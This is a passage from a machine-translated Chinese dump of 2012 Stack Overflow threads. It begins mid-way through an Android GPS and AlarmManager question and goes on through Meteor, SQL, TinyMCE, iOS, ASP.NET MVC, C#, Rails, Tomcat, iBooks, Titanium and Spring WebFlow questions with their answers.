      Toast.makeText(this, "Provider " + provider + " has been selected." ,Toast.LENGTH_SHORT).show();
      onLocationChanged(location);
    } else {
      latituteField.setText("Is GPS ON ?");
      longitudeField.setText("Sorry! No GPS");
    }
  }

  /* Request updates at startup */
  @Override
  protected void onResume() {
    super.onResume();
    locationManager.requestLocationUpdates(provider, 400, 1, this);
  }

  /* Remove the locationlistener updates when Activity is paused */
  @Override
  protected void onPause() {
    super.onPause();
    locationManager.removeUpdates(this);
  }

  @Override
  public void onLocationChanged(Location location) {
    double lat = (double) (location.getLatitude());
    double lng = (double) (location.getLongitude());
    //Http Post method to send data to srver Php document
    Toast.makeText(this, "Transfered location: "+lat+" "+lng ,Toast.LENGTH_SHORT).show();
    Toast.makeText(this, "Currently using " + provider + " technology." ,Toast.LENGTH_SHORT).show();
    //latituteField.setText(String.valueOf(lat));
    //longitudeField.setText(String.valueOf(lng));
  }

  @Override
  public void onStatusChanged(String provider, int status, Bundle extras) {
    // TODO Auto-generated method stub
      Toast.makeText(this, "Location Change Notification !!" ,Toast.LENGTH_SHORT).show();

  }

  @Override
  public void onProviderEnabled(String provider) {
    Toast.makeText(this, "Enabled new provider " + provider,
        Toast.LENGTH_SHORT).show();

  }

  @Override
  public void onProviderDisabled(String provider) {
    Toast.makeText(this, "Disabled provider " + provider,
        Toast.LENGTH_SHORT).show();
  }
} 
```

我希望我的这个活动以固定的时间间隔开始，我尝试了警报管理器和广播接收器，但是......我找不到任何方法从广播接收器开始......

```
public class MyBroadcastReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {
    //Toast.makeText(context, "Location Cordinates Updating!!!!.",Toast.LENGTH_LONG).show();

    Toast.makeText(context, "Current Location :",Toast.LENGTH_LONG).show();
    Intent startIntent = new Intent(context, LocUpdator.class);
    context.startActivity(startIntent);
    startIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
```

上面是广播接收器

警报活动如下

public class AlarmActivity extends Activity { /** 首次创建活动时调用。*/

```
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
}

public void startAlert(View view) {
    //EditText text = (EditText) findViewById(R.id.time);
    int i = 20;//Integer.parseInt(text.getText().toString());
    //int i= 10;
    Calendar calendar = Calendar.getInstance(); 
    calendar.setTimeInMillis(System.currentTimeMillis()); 
    Intent intent = new Intent(this, MyBroadcastReceiver.class);
    PendingIntent pendingIntent = PendingIntent.getBroadcast(
            this.getApplicationContext(), 234324243, intent, 0);

    AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
    alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+ (i * 1000), pendingIntent);
    //long timerInterval= i*1000;
    //alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), timerInterval, pendingIntent); 
    //finish();  
    Toast.makeText(this, "DB Update Interval set as " + i + " seconds",
            Toast.LENGTH_LONG).show();
} 
```

}

请帮帮我:-)

* * *

日志猫错误如下

```
09-10 09:50:15.368: E/AndroidRuntime(671): FATAL EXCEPTION: main
09-10 09:50:15.368: E/AndroidRuntime(671): java.lang.RuntimeException: Unable to start activity ComponentInfo{twin.geolocator/twin.geolocator.insideActivity}: java.lang.IllegalArgumentException: provider==null
09-10 09:50:15.368: E/AndroidRuntime(671):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2059)
09-10 09:50:15.368: E/AndroidRuntime(671):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2084)
09-10 09:50:15.368: E/AndroidRuntime(671):  at android.app.ActivityThread.access$600(ActivityThread.java:130)
09-10 09:50:15.368: E/AndroidRuntime(671):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1195)
09-10 09:50:15.368: E/AndroidRuntime(671):  at android.os.Handler.dispatchMessage(Handler.java:99)
09-10 09:50:15.368: E/AndroidRuntime(671):  at android.os.Looper.loop(Looper.java:137)
09-10 09:50:15.368: E/AndroidRuntime(671):  at android.app.ActivityThread.main(ActivityThread.java:4745)
09-10 09:50:15.368: E/AndroidRuntime(671):  at java.lang.reflect.Method.invokeNative(Native Method)
09-10 09:50:15.368: E/AndroidRuntime(671):  at java.lang.reflect.Method.invoke(Method.java:511)
09-10 09:50:15.368: E/AndroidRuntime(671):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
09-10 09:50:15.368: E/AndroidRuntime(671):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
09-10 09:50:15.368: E/AndroidRuntime(671):  at dalvik.system.NativeStart.main(Native Method)
09-10 09:50:15.368: E/AndroidRuntime(671): Caused by: java.lang.IllegalArgumentException: provider==null
09-10 09:50:15.368: E/AndroidRuntime(671):  at android.location.LocationManager.getLastKnownLocation(LocationManager.java:1153)
09-10 09:50:15.368: E/AndroidRuntime(671):  at twin.geolocator.insideActivity.onCreate(insideActivity.java:32)
09-10 09:50:15.368: E/AndroidRuntime(671):  at android.app.Activity.performCreate(Activity.java:5008)
09-10 09:50:15.368: E/AndroidRuntime(671):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1079)
09-10 09:50:15.368: E/AndroidRuntime(671):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2023)
09-10 09:50:15.368: E/AndroidRuntime(671):  ... 11 more 
```

* * *

```
public class insideActivity extends Activity implements LocationListener{

private LocationManager locationManager;
private String provider;
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
   // setContentView(R.layout.main);

    // Get the location manager
    locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    // Define the criteria how to select the locatioin provider -> use
    // default
    Criteria c = new Criteria();
    c.setAccuracy(Criteria.ACCURACY_FINE);
    c.setAltitudeRequired(false);
    c.setBearingRequired(false);
    c.setSpeedRequired(false);
    c.setCostAllowed(true);
    c.setPowerRequirement(Criteria.POWER_HIGH);
    provider = locationManager.getBestProvider(c,true);
    Location location = locationManager.getLastKnownLocation(provider);

    // Initialize the location fields
    if (location != null) {
      System.out.println("Provider " + provider + " has been selected.");
      onLocationChanged(location);
    } else {
      Log.d("Location not available", "inside");
      Log.d("Location not available", "inside ");
    }
    Log.d("Inside onCreate", "1");
  }

@Override
public void onLocationChanged(Location location) {
    // TODO Auto-generated method stub
    Log.d("Inside onLocationChanged", "2");

}

@Override
public void onProviderDisabled(String arg2) {
    // TODO Auto-generated method stub
    Log.d("Inside onProviderDisabled", "3");

}

@Override
public void onProviderEnabled(String arg3) {
    // TODO Auto-generated method stub
    Log.d("Inside onProviderEnabled", "4");
}

@Override
public void onStatusChanged(String arg1, int status, Bundle extras) {
    // TODO Auto-generated method stub
    Log.d("onStatusChanged", "");
}

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T12:44:26.717

阅读我的评论，然后用它来延迟......

对于重复任务：

```
new Timer().scheduleAtFixedRate(task, after, interval); 
```

对于任务的单次运行：

```
new Timer().schedule(task, after); 
```

task 是在初始执行时间之后要执行的方法（间隔重复执行的时间）

# meteor - 自从更新到 Meteor 版本 0.4 后的错误

> ID：12300261
> 
> 赞同：-1
> 
> 时间：2012-09-06T12:35:37.360
> 
> 标签：meteor

我有一个带有输入元素列表的模板。它们的值是文档的标题元素。input-elements 有一个 keyup-event，所以当我在 input-element 中写入时，标题会更新。当我关注输入元素时，会话变量 selectedDoc 设置为文档的 id。在那之前它可以工作。在另一个模板中，我有以下功能：

```
Template.content.isSelected = function () {
 return !Session.equals("selectedDoc",null) ? 'small' : ''; 
} 
```

当我在我的代码中使用上面的函数时，会出现以下错误。当我聚焦一个输入元素并写一些东西时，在第一个字母之后焦点消失了。该错误仅在第一次发生时，我关注一个输入元素。

我究竟做错了什么？使用版本 0.3.9 一切正常。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T17:40:29.763

> 我究竟做错了什么？

您没有关注 Meteor 或阅读更改日志，因此您没有注意到 API 更改。

如果您阅读它们，尤其是 Spark，并相应地调整您的代码；您的代码将在 0.4 上运行。

# sql - 在 SQL 中存储用户定义数据的正确方法

> ID：12300262
> 
> 赞同：1
> 
> 时间：2012-09-06T12:35:42.447
> 
> 标签：sql, forms, database-design, normalization, entity-attribute-value

我想构建一个类似于 wufoo 的在线表单构建器，它允许用户创建和发布他们自己的 Web 表单。每个提交都应保存到数据库中，用户以后可以在该数据库中检索提交。

因为这些形式将是动态的，即。用户可以完全控制表单字段的数量和类型我试图考虑一个可靠的数据库设计来存储这些信息。

我将有一个表字段类型，其中包含用户可用的每种类型的字段，即。文本字段、电子邮件字段等

一个 baseform 表，它将保存每个表单 id、url 等。

然后，我将有一个表格表单字段，其中将包含对 baseform 和 fieldtype 的引用，该表格还可以包括要对每个字段进行的自定义验证。

这种设计作为基础结构好吗？我想向应用程序添加新类型的字段会很容易，但是我不知道潜在的缺点是什么，因为我远非 sql 专家。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:42:46.313

> 在 SQL 中存储用户定义的数据

我认为您正在寻找[Entity-attribute-value](http://en.wikipedia.org/wiki/Entity%E2%80%93attribute%E2%80%93value_model)数据库模型，其中：

> 基本思想是将属性及其对应的值存储为单个表中的行。
> 
> 通常，该表至少具有三列：实体、属性和值。尽管如果只有一个相关实体，例如用于应用程序配置或选项设置的表，则可以排除实体列。

请参阅此页面作为开始：

*   [使用数据库元数据及其语义生成自动和动态 Web 条目表单](http://www.iaeng.org/publication/WCECS2007/WCECS2007_pp654-658.pdf)(pdf)

*   [规划和实施元数据驱动的数字存储库](http://scholarspace.manoa.hawaii.edu/bitstream/handle/10125/337/0409CCQPlanningImplementing.pdf?sequence=1)(pdf)

我用[entity-attribute-value](/questions/tagged/entity-attribute-value "显示标记为“实体属性值”的问题")标签重新标记了您的问题，您可以在其中浏览许多与您的案例相关的线程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-10T10:33:37.563

正如 Mahmoud Gamal 所写，您描述的模型是“实体/属性/值”；正如 Borys 所写，这种模型存在许多已知问题。

作为替代方案，您可能会考虑将表单条目存储在关系模型中的“文档”（例如 XML 或 JSON）中。

例如，您可能有一个表格，如下所示：

```
FORM_SUBMISSION
--------------------
Submission_ID (pk)
Client_ID (fk to clients table)
Submission_date
SubmissionDocument 
```

我使用“客户端”来代表创建表单的用户；要检索给定客户端的所有提交，您可以在 client_id 上使用 where 子句。

该模型使得针对表单提交运行 SQL 查询变得更加困难（尽管在超出非常简单的查询时，EAV 也变得困难），但它极大地简化了持久性解决方案。

# mysql - 绕过 where 子句的子查询

> ID：12300267
> 
> 赞同：0
> 
> 时间：2012-09-06T12:35:57.917
> 
> 标签：mysql

早上好，mysql 查询显示已完成日期字段和总行数的案例，我想根据总案例计算这个，但不确定我是否可以在一个查询中完成所有这些。例如当前查询输出

```
Aug Sep Nov Total
10  20  20  50 
```

那是的代码

```
 SELECT * from(
     Select Count(b.CaseID) As TotDB 
     from tblcontacts a 
     Inner Join  tblcases b 
     On a.ContactID = b.ContactAssignedTo)a
CROSS JOIN
    (Select
  Sum(Month(b.StatusSubmittedDate) = 8) As Aug,
  Sum(Month(b.StatusSubmittedDate) = 9) As Sep,
  Sum(Month(b.StatusSubmittedDate) = 10) As Oct,
  Count(b.CaseID) As Total,
  ROUND (100*Count(b.CaseID)/Count(b.CaseID),2) As Conversion
From
  tblcontacts a Inner Join
  tblcases b On a.ContactID = b.ContactAssignedTo
Where
  b.StatusSubmittedDate > '2012 - 01 - 01'
Group By
  a.ContactFullName With Rollup
Having
  Sum(b.CaseCommission) > 0.01)b 
```

我需要它的输出如下，所以我在上面添加了 TotDB 行，看看是否有帮助，但没有。我需要知道的是，我能否在此查询中有一个列绕过 where/have 子句来显示所有记录

```
Aug Sep Nov Tot TotDB %Converted
10  20  20  50  100   50% 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:43:24.643

也许你应该这样做：

```
select Aug,Sep, Nov, Tot,TotDB,(Tot/TotDB*1.0)*100 as '%Converted' 
 from 
(SELECT * from(
     Select Count(b.CaseDate) As TotDB 
     from tblcontacts a 
     Inner Join  tblcases b 
     On a.ContactID = b.ContactAssignedTo)a
CROSS JOIN
    (select  
      Sum(Month(b.StatusSubmittedDate) = 9) As Sep,
      Sum(Month(b.StatusSubmittedDate) = 10) As Oct,
      Sum(Month(b.StatusSubmittedDate) = 11) As Nov,
      Count(b.CaseID) As Total,
    From tblcontacts a 
    Inner Join tblcases b 
    On a.ContactID = b.ContactAssignedTo
    Where
      b.StatusSubmittedDate > '2012-01-01'
    Group By
      a.ContactFullName With Rollup
    Having
      Sum(b.CaseCommission) > 0.01)b)c 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:53:09.160

您不能在一个简单的查询中做到这一点。

正确的方法是执行第二个查询，不使用 where 子句。真的。

如果您必须在一个查询中执行此操作，请至少使用一个联合：

```
/* old query */
SELECT a,b,c from t1,t2,t3 where d=e group by a having b>f
UNION
select 'total',COUNT(*),NULL /*need the same amount of rows*/
from t1,t2,t3 
```

并让您的客户端以不同的方式处理该行`a='total'`。但这是一个黑客。我建议您使用两个查询。

# asp.net-mvc - 将 tinymce 与弹出插件一起使用

> ID：12300274
> 
> 赞同：1
> 
> 时间：2012-09-06T12:36:20.307
> 
> 标签：asp.net-mvc, tinymce

我尝试为我的网站加载 tinymce 脚本：

```
<script src="/Content/tiny_mce/tiny_mce.js" type="text/javascript"></script>
<script src="/Content/tiny_mce/tiny_mce_popup.js" type="text/javascript"></script> 
```

但在此过程中，我`TypeError: tinymce is null`从`tiny_mce_popup.js`

tinymce 有问题吗？我使用 tinymce 3.5.6

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T05:40:05.513

问题是我不应该把这两个文件放在一起。`tiny_mce_popup.js`只能在应该是弹出窗口的文档中使用。

# ios - 当我调用 resignFirstResponder 时，如何避免 iPad 键盘被关闭？

> ID：12300280
> 
> 赞同：0
> 
> 时间：2012-09-06T12:36:39.453
> 
> 标签：ios, ipad

调用时如何避免 iPad 键盘被关闭

```
[textField resignFirstResponder]; 
```

由于焦点从前一个文本字段移动到新文本字段，我希望键盘保持在原位。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T12:40:46.173

无需调用`resignFirstResponder`即可将焦点从一个更改`TextField`为另一个。

只需调用您要关注`becomeFirstResponder`的内容即可。`testfield`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T12:40:27.330

不要调用 resignFirstResponder 只是让其他文本字段调用

```
[textField2 becomeFirstResponder]; 
```

键盘应该保留并且第二个文本字段变为活动状态

# html - ASP.NET MVC 模型列表绑定

> ID：12300281
> 
> 赞同：8
> 
> 时间：2012-09-06T12:36:39.900
> 
> 标签：html, asp.net-mvc-3, forms, post, model-binding

这是我的模型：

```
public class Items
    {
        public string Foo { get; set; }
        public string Bar { get; set; }
    } 
```

控制器：

```
public ActionResult Index()
    {
        var model = new List<Items>
                        {
                            new Items
                                {
                                    Foo = "foo",
                                    Bar = "bar"
                                },
                            new Items
                                {
                                    Foo = "ai",
                                    Bar = "ia"
                                },
                            new Items
                                {
                                    Foo = "one",
                                    Bar = "two"
                                }
                        };
        return View(model);
    }

    [HttpPost]
    public ActionResult Index(List<Items> model)
    {
        return View(model);
    } 
```

查看（索引）：

```
@using (Html.BeginForm())
{
    for (int i = 0; i < Model.Count; i++)
    {
        <div onclick="$(this).remove();">
            @Html.TextBoxFor(model => model[i].Foo) <br/>
            @Html.TextBoxFor(model => model[i].Bar)
        </div>
    }
    <div>
        <input type="submit"/>
    </div>
} 
```

我删除第二对：

```
 <div onclick="$(this).remove();">
        <input name="[0].Foo" type="text" value="foo"> <br>
        <input name="[0].Bar" type="text" value="bar">
    </div>

    <div onclick="$(this).remove();">
        <input name="[2].Foo" type="text" value="one"> <br>
        <input name="[2].Bar" type="text" value="two">
    </div> 
```

发布时，我只得到第一对（“foo”和“bar”）。这是因为第三对具有索引“2”。我想得到两对（不使用 FormCollection。我希望它自动绑定）。实际上，我在表单上有许多其他输入，所以我不想重新加载索引并将索引重新附加到每个输入。你能帮助我吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-06T12:49:39.267

这可能对你有帮助......

需要在每个项目上放置隐藏字段...

[MVC3 非顺序索引和 DefaultModelBinder](https://stackoverflow.com/questions/8598214/mvc3-non-sequential-indices-and-defaultmodelbinder)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-06T13:13:08.683

感谢 Amit Prajapati，我找到了解决方案：

```
@using (Html.BeginForm())
{
    for (int i = 0; i < Model.Count; i++)
    {
        var identifier = Guid.NewGuid();
        <div onclick="$(this).remove();">
            @Html.Hidden("Index", identifier)
            @Html.TextBox("[" + identifier + "].Foo")
            <br/>
            @Html.TextBox("[" + identifier + "].Bar")
        </div>
    }
    <div>
        <input type="submit" />
    </div>
} 
```

# c# - 构造没有引用的对象？

> ID：12300282
> 
> 赞同：1
> 
> 时间：2012-09-06T12:36:45.080
> 
> 标签：c#, reference

我几乎可以肯定这违反了 C# 的基本规律，但是否可以通过引用构造一个“数组”或“集合”项目？

如果做不到这一点，还有其他方法可以在参数化静态方法中构造复选框吗？

希望我的伪代码有意义（一切有关`Construct2`）

```
CheckBox cb = null, cb2 = null;

Main()
{
    Construct(ref cb);//works
    Construct2(new []{ref cb, ref cb2});//isnt going to work!
}

static void Construct(ref CheckBox cb){
    cb = new CheckBox();//works
}

static void Construct2(CheckBox[] cbs) { //
    cbs[0] = new CheckBox();
    cbs[1] = new CheckBox();
    //for (int i = 0; i < cbs.Length;i++){
    //    cbs[i] = new CheckBox();
    //}
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T12:55:00.590

您不能传递这样的`ref`变量数组。如果您希望能够像这样构造“进入”多个变量，我认为您需要传入某种设置器：

```
void Construct2 (params Action<Checkbox>[] cbas)
{
    foreach (var cba in cbas) cba(new Checkbox());
}

Construct2(
    (c) => cb = c,
    (c) => cb2 = c); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:01:27.523

> 如果做不到这一点，还有其他方法可以在参数化静态方法中构造复选框吗？

是的，让该方法*返回*一个复选框数组，而不是尝试传入引用。

```
static CheckBox[] Construct2()
{
    //....
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T13:05:16.497

我不相信这在 C# 中是可能的。为了使用指针，您必须在`unsafe`上下文中声明您的代码，并使用`/unsafe`. 但是，这仅适用于诸如结构之类的值类型，不适用于托管对象（这是`Checkbox`您可能会使用的大多数东西）。

# ruby-on-rails - 渲染文件名数组

> ID：12300286
> 
> 赞同：0
> 
> 时间：2012-09-06T12:36:49.953
> 
> 标签：ruby-on-rails, ruby

我正在尝试从当前目录打印文件列表。我用了

```
@files = Dir.glob('*') 
```

在视图中我正在尝试使用

```
<%= @files.each {|file| puts "<li>" + file + "</li>"}%> 
```

但相反，它只打印我的文件名数组，没有`<li>`标签。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-06T12:40:19.200

正如亚历克斯所说，puts 可能会将其推送到服务器日志，这是您可以执行的操作：

```
<% @files.each do |file| %>
  <li><%= file %></li>
<% end %> 
```

由于您在 @files 之前有 =，因此您会看到数组的字符串输出。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-06T12:40:31.833

采用

```
<% @files.each do |file| %>
<li> <%= file %></li>
<% end %> 
```

您似乎没有正确理解 erb 语法的语法。

`puts`将打印日志文件中的值而不是在网页上

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-06T12:43:42.130

在帮手

```
def display_files(dir='*')
 list = ""
 files = Dir.glob(dir)
 @files.each do |file|
  list << "<li>#{file}</li>"
 end
list

end 
```

在视图中

# tomcat - Spring，Tomcat @HandleTypes 注释错误

> ID：12300287
> 
> 赞同：0
> 
> 时间：2012-09-06T12:36:52.053
> 
> 标签：tomcat, maven, spring-mvc

我正在运行一个相对简单的注释驱动的 Spring 配置 Web 应用程序。我正在使用 Java 1.6、Tomcat 7，并且我相信我的 pom.xml 中有适当的依赖项，即 jsp-api:2.2、javax.servlet-api:3.0.1。尽管我的 webapp 在运行时似乎没有任何问题，但我不断收到以下错误。我确实在网上找到了对这个错误的引用，它建议将 'metadata-complete="true"' 添加到我的 web.xml 文件中，这使得 @HandleTypes 错误消失但阻止了我的应用程序正确构建自身。

任何建议/帮助将不胜感激。谢谢！

> 2012 年 9 月 5 日下午 1:29:52 org.apache.catalina.startup.ContextConfig checkHandlesTypes
> 警告：无法加载类 [javax.servlet.jsp.el.ImplicitObjectELResolver$ImplicitObjects] 以检查一个或多个的 @HandlesTypes 注释ServletContentInitializers。
> 
> java.lang.ClassNotFoundException: javax.servlet.jsp.el.ImplicitObjectELResolver$ImplicitObjects at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1688) at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader .java:1533) 在 org.apache.catalina.startup.ContextConfig.checkHandlesTypes(ContextConfig.java:1988) 在 org.apache.catalina.startup.ContextConfig.processAnnotationsStream(ContextConfig.java:1951) 在 org.apache.catalina。 startup.ContextConfig.processAnnotationsJar(ContextConfig.java:1840) 在 org.apache.catalina.startup.ContextConfig.processAnnotationsUrl(ContextConfig.java:1808) 在 org.apache.catalina.startup.ContextConfig.processAnnotations(ContextConfig.java:1794)在 org.apache.catalina.startup.ContextConfig。webConfig(ContextConfig.java:1214) 在 org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:828) 在 org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:302) 在 org.apache .catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119) at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90) at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java :5148) 在 org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:866) 在 org.apache.catalina.core 的 org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)。 ContainerBase.addChild(ContainerBase.java:842) 在 org.apache.catalina.core.StandardHost.addChild(StandardHost.java:615) 在 org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:958) 在 org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1599) 在 java.util.concurrent.Executors $RunnableAdapter.call(Executors.java:441) at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:303) at java.util.concurrent.FutureTask.run(FutureTask.java:138) at java. util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) 在 java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) 在 java.lang.Thread.run(Thread.java:662)Executors$RunnableAdapter.call(Executors.java:441) at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:303) at java.util.concurrent.FutureTask.run(FutureTask.java:138) at java .util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) 在 java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) 在 java.lang.Thread.run(Thread.java:662 )Executors$RunnableAdapter.call(Executors.java:441) at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:303) at java.util.concurrent.FutureTask.run(FutureTask.java:138) at java .util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) 在 java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) 在 java.lang.Thread.run(Thread.java:662 )运行（线程.java：662）运行（线程.java：662）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T18:10:02.620

您应该确保您的`war`文件不包含 Servlet API 和 JSP API `jar`，否则您将遇到棘手的类加载问题。

但是，您仍然需要它们作为编译时依赖项。对于这种情况，Maven 允许您使用 scope 声明这些依赖项`provided`。

因此，请确保`jsp-api:2.2`并`javax.servlet-api:3.0.1`拥有`<scope>provided</scope>`.

# ipad - iPad 上 iBooks/Safari 中的 JS 计时器粒度很差？

> ID：12300288
> 
> 赞同：1
> 
> 时间：2012-09-06T12:37:03.007
> 
> 标签：ipad, safari, settimeout, ibooks

我正在创建在 iBooks 下运行的脚本化电子书。他们使用 JS`setTimeout`和/或`requestAnimationFrame`. 在对动画运行如此缓慢的原因进行了广泛调试之后，我发现计时器正在触发，而不是在我要求的 20-50 毫秒内（并进入桌面上的 Chrome 或 Safari），间隔时间**超过 10 倍**，有时长达**一秒或更长时间**（这是`setTimeout`，因为显然`requestAnimationFrame`/`webkitRequestAnimationFrame`在 iOS 中不可用，或者至少在 iBooks 版的 webkit 中不可用）。

经过进一步研究，我发现这显然不是 iBooks 问题，而是 iPad 问题——我在 iPad 上的 Safari 中发现了类似的粒度。这只是慢速处理器的功能（我正在 iPad 2 上进行测试），如此处所讨论[的吗](https://stackoverflow.com/questions/3213307/javascript-speed-optimization-for-ipad-phonegap-dhtml-game)？

[或者这](https://stackoverflow.com/questions/11177774/setinterval-pauses-in-iphone-ipad-mobile-safari-during-scrolling)是否与 setTimeout 被报告在滚动期间不起作用有关（尽管在我的情况下不涉及滚动）？

供您参考，我正在做的动画类型不是可以使用可能是硬件加速的 CSS 动画来实现的。

底线，有没有人知道如何在 iPad 上的 JS 中获得更精细的计时器粒度，无论是在 iBooks 还是 Safari 中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-29T15:04:49.817

我发现问题在于 iBooks 在第一次打开时会通读整本书，打开（并在其上运行脚本）每一页。此外，它似乎没有正确地将来自当前打开页面的请求优先于其后台页面预读工作，因此在预读过程完成之前，这可能需要几十秒的时间，对于一本大型、脚本繁重的书、计时器当前页面上的响应能力（无论是`setTimeout`还是`requestAnimationFrame`）可能会受到严重影响。

# titanium - 表视图中的钛 android 数据反射

> ID：12300293
> 
> 赞同：0
> 
> 时间：2012-09-06T12:37:12.417
> 
> 标签：titanium, titanium-mobile, titanium-modules

Google APIs Android 2.3.1 ，数据库表中的数据更改不会反映在 tableview 屏幕中，但是如果我们重新启动应用程序，将显示更改，并且如果我们加载 app.js 将显示最近的更改。

谁能帮我解决这个问题？？

```
fireEvent("db_update") 
```

&
addEventListener('db_update', function() {这里应该更新表数据})

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T14:58:36.750

要更新数据库，您需要先将其删除，然后再安装一个新数据库。或运行查询以更新当前查询。

这是我根据存储在属性中的版本号更新数据库的方式：

```
function updateDatabase(version){
    if (version != Ti.App.Properties.getInt('version',0)){
        sb.db.remove();
        sb.db = Ti.Database.install('/lib/db.sqlite','db');
        Ti.App.Properties.setInt('version',version);
    }
} 
```

在应用程序中，在启动时，我使用手动输入的版本号运行该函数。每次您的数据库更改时，您都可以手动更改此数字。

```
updateDatabase(5); 
```

这当然不反映对表格内容的定期更新。（当您在数据库上运行常规查询时）。

在这种情况下，您应该自己重建 tableview 的内容（您有填充 tableview 的代码，重新运行该代码）或找到一种方法来定位您需要使用 ID 更改的确切行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-09T06:26:21.220

我找到了解决方案，

```
Ti.App.addEventListener('updatedb', updateData); 
```

这里的'updateData'是从数据库中获取tableview数据的函数。在“updateData”函数的底部，为表格视图设置数据

```
i.e)   tableview.setData(data); 
```

然后，您的插入、更新或删除功能应该触发“updatedb”功能

IE）

```
function deleteData(recId)  {
    var db = Ti.Database.open(DBNAME);
        db.execute(" DELETE FROM tblName WHERE id IN("+ recId+") ");
        db.close();

    Ti.App.fireEvent('dataupdated');
} 
```

现在，调用 deleteData 函数后，您的 tableview 数据将显示没有删除的记录。

# java - 如何更新 Spring WebFlow 模型中的数据并将其传递回同一视图

> ID：12300294
> 
> 赞同：1
> 
> 时间：2012-09-06T12:37:13.893
> 
> 标签：java, spring, hibernate, spring-mvc, spring-webflow

如何更新 Spring WebFlow 模型中的数据并将其传递回同一视图。

我有一个正在处理的项目，如果用户从选择框中选择一个项目，我需要返回服务器，将一些数据填充到需要在视图上显示的模型中。

您可以从我的视图状态中看到，一旦选择了项目，我就会为 SelectBoxPicked 启动一个转换并使用模型调用我的控制器，但是如何将更新的模型返回到视图？

有人可以告诉我要在我的 java（控制器）代码和 flow.xml 中放入什么来完成这项工作。

```
<view-state id="SchoolVisitReport" view="SchoolVisitReport.jsp" model="visit" >
 <transition on="submit" to="addVisit">
  <evaluate expression="flowActions.validateVisit(visit, messageContext)"/>
 </transition>

 <transition on="loadSchools" to="SchoolVisitReport" >
  <evaluate expression="flowActions.initializeSelectableSchools(visit)" result="flowScope.selectableSchools"/>
 </transition>

 <transition on="SelectBoxPicked" to="SchoolVisitReport" >
  <evaluate expression="flowActions.fillDetails(visit)" />
 </transition>

  <transition on="cancel" to="endState" bind="false"/>
</view-state> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T14:22:47.220

您可能想看看[http://static.springsource.org/spring-webflow/docs/2.0.x/reference/htmlsingle/spring-webflow-reference.html#view-transitions](http://static.springsource.org/spring-webflow/docs/2.0.x/reference/htmlsingle/spring-webflow-reference.html#view-transitions) 特别是事件处理程序部分

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:31:09.450

该基本方法有效；我们自己用过。[您从评估方法调用的 Java 代码可以返回`false`以阻止转换](http://static.springsource.org/spring-webflow/docs/2.3.x/reference/htmlsingle/spring-webflow-reference.html#view-transitions)，尽管无论如何这只会转换回当前状态。我相信除此之外的任何事情`false`都会让你过渡。

# php - 获取在 phpmyadmin 上工作的 microsoft server 2008 sql 查询

> ID：12300295
> 
> 赞同：0
> 
